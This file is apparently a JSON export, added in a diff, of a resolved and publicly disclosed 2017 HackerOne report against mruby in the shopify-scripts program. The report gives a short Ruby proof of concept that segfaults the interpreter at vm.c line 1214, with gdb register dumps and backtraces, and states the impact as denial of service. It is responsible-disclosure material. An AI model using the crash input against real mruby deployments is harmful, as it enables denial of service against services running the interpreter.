@@ -1,0 +1,114 @@
+{
+  "id": 201905,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDE5MDU=",
+  "url": "https://hackerone.com/reports/201905",
+  "title": "SIGSEGV - vm.c - line:1214",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2017-01-29T11:09:12.690Z",
+  "submitted_at": "2017-01-29T11:09:12.690Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ston3",
+    "url": "/ston3",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-03-29T23:34:29.594Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-02-27T23:34:17.058Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "PoC\n-------------------\n\nThe following code triggers the bug (attached as test_mrb_vm_exec_1214.rb):\n\n\tdef test\n\tinstance_exec do return to_enum:==end ensure end\n\ttest\n\nDebug - mirb\n-------------------\n\n\t(gdb) r test_mrb_vm_exec_1214.rb \n\tStarting program: /home/x/Desktop/research/3_fuzz/mruby/bin/mirb test_mrb_vm_exec_1214.rb\n\tmirb - Embeddable Interactive Ruby Shell\n\n\t => :test\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x0000000000412418 in mrb_vm_exec (mrb=<optimized out>, proc=<optimized out>, pc=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:1214\n\t1214\t        JUMP;\n\t(gdb) info reg\n\trax            0x6fb4\t28596\n\trbx            0x8\t8\n\trcx            0x748350\t7635792\n\trdx            0x765520\t7755040\n\trsi            0x748350\t7635792\n\trdi            0x759010\t7704592\n\trbp            0x759010\t0x759010\n\trsp            0x7fffffffc780\t0x7fffffffc780\n\tr8             0xfffffffffffffffc\t-4\n\tr9             0x7ffff7acd7b8\t140737348687800\n\tr10            0x4a\t74\n\tr11            0x759030\t7704624\n\tr12            0xfffffffffffffffc\t-4\n\tr13            0x0\t0\n\tr14            0x0\t0\n\tr15            0x759030\t7704624\n\trip            0x412418\t0x412418 <mrb_vm_exec+15352>\n\teflags         0x10206\t[ PF IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t1209\t        }\n\t1210\t        mrb->c->stack[0] = result;\n\t1211\t        mrb->c->stack = ci->stackent;\n\t1212\t        pc = ci->pc;\n\t1213\t        cipop(mrb);\n\t1214\t        JUMP;\n\t1215\t      }\n\t1216\t      else {\n\t1217\t        /* setup environment for calling method */\n\t1218\t        proc = mrb->c->ci->proc = m;\n\n\nBacktrace - mirb\n-------------------\n\n\t(gdb) bt\n\t#0  0x0000000000412418 in mrb_vm_exec (mrb=<optimized out>, proc=<optimized out>, pc=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:1214\n\t#1  0x0000000000402e68 in main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\nDebug - mruby\n-------------------\n\n\t(gdb) r test_mrb_vm_exec_1214.rb \n\tStarting program: /home/x/Desktop/research/3_fuzz/mruby/bin/mruby test_mrb_vm_exec_1214.rb\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x00000000004120b8 in mrb_vm_exec (mrb=<optimized out>, proc=<optimized out>, pc=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:1214\n\t1214\t        JUMP;\n\t(gdb) info reg\n\trax            0x6fb4\t28596\n\trbx            0x8\t8\n\trcx            0x748330\t7635760\n\trdx            0x765520\t7755040\n\trsi            0x748330\t7635760\n\trdi            0x759010\t7704592\n\trbp            0x759010\t0x759010\n\trsp            0x7fffffffd900\t0x7fffffffd900\n\tr8             0xfffffffffffffffc\t-4\n\tr9             0x7ffff7acd7b8\t140737348687800\n\tr10            0x4a\t74\n\tr11            0x759030\t7704624\n\tr12            0xfffffffffffffffc\t-4\n\tr13            0x0\t0\n\tr14            0x0\t0\n\tr15            0x759030\t7704624\n\trip            0x4120b8\t0x4120b8 <mrb_vm_exec+15352>\n\teflags         0x10206\t[ PF IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t1209\t        }\n\t1210\t        mrb->c->stack[0] = result;\n\t1211\t        mrb->c->stack = ci->stackent;\n\t1212\t        pc = ci->pc;\n\t1213\t        cipop(mrb);\n\t1214\t        JUMP;\n\t1215\t      }\n\t1216\t      else {\n\t1217\t        /* setup environment for calling method */\n\t1218\t        proc = mrb->c->ci->proc = m;\n\nBacktrace - mruby\n-------------------\n\n\t(gdb) bt\n\t#0  0x00000000004120b8 in mrb_vm_exec (mrb=<optimized out>, proc=<optimized out>, pc=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:1214\n\t#1  0x000000000041bebd in mrb_vm_run (proc=0x75c150, self=..., stack_keep=4294967292, mrb=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:790\n\t#2  mrb_top_run (mrb=0x759010, proc=0x75c150, self=..., stack_keep=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:2514\n\t#3  0x00000000004a533f in mrb_load_exec (mrb=0x759010, p=<optimized out>, c=0x7b40e0) at /home/x/Desktop/research/3_fuzz/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n\t#4  0x0000000000402c67 in main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n\nImpact\n-------------------\n\nIt can cause DoS.",
+  "weakness": {
+    "id": 48,
+    "name": "Denial of Service"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 155837,
+      "file_name": "test_mrb_vm_exec_1214.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/155/837/5c2dcb3bf1702d2a4a40f3cb7e185e488a05a427/test_mrb_vm_exec_1214.rb?response-content-disposition=attachment%3B%20filename%3D%22test_mrb_vm_exec_1214.rb%22%3B%20filename%2A%3DUTF-8%27%27test_mrb_vm_exec_1214.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU6SKXNFL%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T123351Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBsQY5L%2BFkxRPC58PY5o2r1B4FvJQHizPIG9rlwXtVRvAiAL0D5jMubGIu63HWEEj%2BrlMXD00CwCZl6n%2B2kgNXCz%2BSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIM9fJcytorMyA%2BJcGWKo8FlA6t%2FhW4ihTQDwTO66lwrpmBlh3InHCG7ZNyP57uNt%2FwRHIxvyi6PfiN2yoHKbnj3AHO%2B2d5zoBenUsjkTNVRrSUiifpdaXKnzF7u0bzX9wtP9298ZDuZh%2FGs9ROFHAwwSZO%2BvwKQLvQiKkud03lUkSsYAWSATrr7bzJ1TgRIshBwEoMxF63sGP9s7tsNfzRA%2BRBnErSD0VUQqi0BLoiz8aEpp9YWVfFSARTl85AS70jGdLFyjPSL3p4qQWEPUkiV0yqHhdAEAs09CT1fGjn4y7il2MxOD%2BwERRa3lBGnRAFCEqrktUlGxrk%2BtAvTc%2B7MYBNtBaSu88Qp3FBMeRxgNXuz4B4aE75hNE7hCdKjZkNp653DgLLcvSAVkWXKJ8bc7pY8EMi5I1A2Dl%2BW8ZHS7yWw13MauFUqTfpwfPhg4FrjlzkfofKeir9moM1Qw92DiMAzmXNA9VCWZgtwF9peq7cledMqKMhyz553%2BMG21%2FcYWqw%2FWqRrVoyVdqjqI8FKUBe%2BTS1SxpldVu8xEmCKzbfFzq%2FhT%2FkR7exoQXrx2l%2BL7t%2FuGgGEEKJunLBHXQWh79aKlW4%2FLY1zZRs3z63USsKCdupXOFqYSXN1SfICON%2Fqq6JqRCfisNv890YfHqytS0RRv6qX0n0SN%2BaUeTqSWHqTP0py0ZSVQX4asOO3F%2FAoFXsCcUW8Hln49ICQ0yyR%2Bcv27Gbe2FMzVWYlJHO79Zqq6ItXDPLhetwQl%2BNTdHzqrRFOsB9FNw7KlAliVAd2TMcGOIN3W1R76B95DRHTSvbmbHOhm%2FIFrdcghtBTzYBtLmNwUj6qld3rUi4V7xCIaxjyaDAD3J3BIh9Z56z79Puv7VTgcD1IbaGvCsbkTDaoa2uBjqyAfXgKJ7u1ZqUyaqlA35nJDggYhFUEhgBeS%2FonLnznw%2F8MZgMPwNTg9%2B%2BKneXQRJEmw0IxrRJCtp8dpbLw%2BejfQTVmdG%2FWK%2BDS%2FFX7U1sRmDMc%2FfmYPqycmml%2Bg9esPYXet%2FKlKaaFDXG3gzd7HfWF0%2BL5V0SyxaHdCxSBI4q4kLfNakyjwzmb4ALjzY0fA2TwRp16US2P1dwfWi2GjYsqaNGUOCV0dxXn6CrIbOv%2F%2Bk4ioM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a856639eac78a7fbc33591b504391f6993f3decc94adb09433e99439b9348e6c",
+      "file_size": 64,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-03-29T23:34:17.087Z",
+  "allow_singular_disclosure_after": -216997174.58379057,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "apapedulimu",
+    "eveeez",
+    "linkks",
+    "rbcafe",
+    "spetr0x"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
